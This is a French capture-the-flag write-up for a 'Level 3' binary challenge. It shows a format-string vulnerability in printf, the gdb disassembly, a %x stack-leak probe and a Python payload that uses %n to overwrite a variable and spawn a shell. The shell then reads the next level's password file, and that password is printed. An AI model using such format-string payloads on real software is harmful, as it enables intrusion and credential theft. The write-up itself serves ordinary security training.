# Level 3

En décompilant le binaire on peut voir qu'il y a un call à la fonction `system` avec pour argument `/bin/sh` mais qu'elle est appelé que si la variable `m` ou `0x804988c` sois égale à `64`.

Le binaire ici utilise la fonction `fgets`, cette fonction est protégé contre les buffers overflow.

Le problème ce que récupère `fgets` devient le format de la fonction `printf`.

`printf` à une option `%n` qui permet d'écrire la nombre de charactère affiché à l'adresse d'une variable et ainsi écrire la valeur `64` à `m`

```shell
~ gdb level3
(gdb) disas v
Dump of assembler code for function v:
[...]
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
[...]
End of assembler dump.
(gdb) quit
~ ./level3
BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
~ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/level3
~ cat /tmp/level3 - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

